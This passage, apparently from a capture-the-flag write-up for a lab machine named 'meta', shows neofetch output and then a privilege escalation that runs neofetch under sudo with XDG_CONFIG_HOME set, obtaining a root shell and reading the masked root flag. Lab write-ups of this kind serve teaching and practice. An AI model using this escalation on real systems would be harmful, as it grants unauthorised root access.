',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 13 hours, 37 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 152MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""

```

But with `$XDG_CONFIG_HOME` set, it returns a shell:

```

thomas@meta:~$ XDG_CONFIG_HOME=~/.config sudo neofetch
# id
uid=0(root) gid=0(root) groups=0(root)
# bash
root@meta:/home/thomas#

```

And I can grab `root.txt`:

```

root@meta:~# cat root.txt
ddaefee6************************

```